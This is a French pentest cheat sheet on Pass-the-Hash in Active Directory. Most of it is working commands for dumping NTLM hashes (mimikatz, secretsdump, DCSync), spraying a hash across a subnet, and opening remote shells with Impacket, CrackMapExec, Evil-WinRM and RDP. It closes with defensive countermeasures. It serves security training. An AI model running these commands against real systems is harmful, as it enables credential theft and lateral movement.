# Pass-the-Hash (PtH)

**Catégorie** : Active Directory
**Phase** : Exploitation / Lateral Movement
**Tags** : #AD #ntlm #lateral-movement

---

## Principe

Windows stocke les mots de passe sous forme de hash NTLM (MD4 du mot de passe en UTF-16LE). Le protocole NTLM utilise ce hash directement pour l'authentification — il n'a jamais besoin du mot de passe en clair.

Pass-the-Hash exploite ce fonctionnement : si on obtient le hash NTLM d'un compte (via dump SAM, DCSync, LSASS, etc.), on peut s'authentifier comme cet utilisateur sur n'importe quelle machine du réseau, sans connaître le mot de passe.

## Prérequis

- Un hash NTLM valide (format : `aad3b435b51404eeaad3b435b51404ee:hash_ntlm`)
- Le compte doit avoir des droits sur la machine cible (admin local ou DA)
- La machine cible doit accepter NTLM (pas uniquement Kerberos)

## Où obtenir des hashes

| Source | Commande | Ce qu'on obtient |
|--------|----------|-----------------|
| SAM locale | `secretsdump -sam SAM -system SYSTEM LOCAL` | Comptes locaux |
| LSASS | `mimikatz sekurlsa::logonpasswords` | Comptes connectés |
| [[DCSync]] | `secretsdump 'DA:pass'@DC` | Tous les comptes du domaine |
| NTDS.dit | `secretsdump -ntds ntds.dit -system SYSTEM LOCAL` | Tous les comptes AD (offline) |
| Responder | Capture NTLMv2 + crack | Un compte à la fois |

## Commandes

### Avec Impacket

```bash
# PsExec → shell SYSTEM
impacket-psexec -hashes :<NTLM_HASH> 'DOMAINE/admin'@<cible>

# WMIExec → shell user
impacket-wmiexec -hashes :<NTLM_HASH> 'DOMAINE/admin'@<cible>

# SMBExec
impacket-smbexec -hashes :<NTLM_HASH> 'DOMAINE/admin'@<cible>

# SecretsDump (dump à distance)
impacket-secretsdump -hashes :<NTLM_HASH> 'DOMAINE/admin'@<cible>
```

### Avec CrackMapExec

```bash
# Vérifier l'accès
cme smb <cible> -u admin -H <NTLM_HASH>

# Exécuter une commande
cme smb <cible> -u admin -H <NTLM_HASH> -x 'whoami'

# Spray un hash sur tout le réseau
cme smb 10.1.1.0/24 -u admin -H <NTLM_HASH>

# Dump SAM à distance
cme smb <cible> -u admin -H <NTLM_HASH> --sam
```

### Avec Mimikatz (Windows)

```
sekurlsa::pth /user:admin /domain:DOMAINE /ntlm:<HASH> /run:cmd.exe
```

### Avec Evil-WinRM

```bash
evil-winrm -i <cible> -u admin -H <NTLM_HASH>
```

### Avec xfreerdp (RDP)

```bash
xfreerdp /v:<cible> /u:admin /pth:<NTLM_HASH>
```

## Variantes

### Pass-the-Ticket (PtT)

Utiliser un ticket Kerberos (TGT ou TGS) au lieu d'un hash NTLM.

```bash
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass 'DOMAINE/admin'@<cible>
```

### Overpass-the-Hash

Convertir un hash NTLM en ticket Kerberos, puis utiliser le ticket. Contourne les protections anti-NTLM.

```bash
# Obtenir un TGT à partir du hash
impacket-getTGT -hashes :<NTLM_HASH> 'DOMAINE/admin'

# Utiliser le TGT
export KRB5CCNAME=admin.ccache
impacket-psexec -k -no-pass 'DOMAINE/admin'@<cible>
```

## Contre-mesures

- **Protected Users** : force Kerberos, bloque NTLM et le caching des credentials
- **Credential Guard** : isole LSASS dans une VM, empêche l'extraction des hashes
- **LAPS** : mots de passe admin locaux uniques par machine (un hash ne fonctionne que sur une machine)
- **Tiering model** : les comptes DA ne se connectent jamais aux postes utilisateurs
- Désactiver NTLM autant que possible (GPO : Network Security: Restrict NTLM)
- Monitorer Event ID 4624 avec logon type 3 + NTLM (au lieu de Kerberos)

## Liens

- [[DCSync]]
- [[NTLM Relay]]
- [[Kerberoasting]]
- [[Golden Ticket]]
- [[Impacket]]
- [[CrackMapExec]]
